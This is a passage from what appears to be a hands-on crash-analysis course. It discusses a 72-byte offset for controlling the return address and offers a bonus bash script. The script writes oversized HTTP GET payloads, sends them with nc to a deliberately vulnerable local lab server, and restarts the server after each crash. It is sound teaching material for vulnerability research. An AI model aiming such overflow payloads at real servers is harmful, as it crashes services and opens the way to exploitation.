5.  **Stack Overflow = RIP Control**: The 72-byte offset gives direct control over the return address.

### Discussion Questions

1.  Why does the stack overflow require 72 bytes to control RIP (not 64)?
2.  How would ASLR affect exploitation of the stack overflow in `vuln_protected`?
3.  Why is the NULL pointer dereference classified as NOT_EXPLOITABLE while the others are EXPLOITABLE?
4.  How would you extend this analysis to include the `vuln_http_server` network target?

### Bonus Challenge: Network Target Analysis

Extend the capstone to include the `vuln_http_server` from Day 4:

```bash
cd ~/crash_analysis_lab/capstone

# Generate HTTP server crashes with long paths
for size in 100 500 1000 2000; do
    python3 -c "import sys; sys.stdout.buffer.write(b'GET /' + b'X'*$size + b' HTTP/1.1\r\n\r\n')" > crashes/http_path_${size}.bin
done

# Test with non-ASAN binary (will show heap corruption on free)
../vuln_http_server &
SERVER_PID=$!
sleep 1

for crash in crashes/http_path_*.bin; do
    echo "Testing $(basename $crash)..."
    cat "$crash" | nc localhost 8888 || true
    sleep 0.5

    if ! kill -0 $SERVER_PID 2>/dev/null; then
        echo "  Server crashed!"
        ../vuln_http_server &
        SERVER_PID=$!
        sleep 1
    fi
done

kill $SERVER_PID 2>/dev/null
```

This adds a **network-accessible** vulnerability to your report and demonstrates an important lesson: **sanitizers have blind spots** - always use multiple detection methods.

### Looking Ahead to Week 5

Next week, we cross the Rubicon. You have the crash, you have the PoC, and you know it's exploitable. Now, we **build the exploit**. We will start with basic stack overflows, defeat simple mitigations, and learn to turn that instruction pointer overwrite into code execution.

<!-- Written by AnotherOne from @Pwn3rzs Telegram channel -->
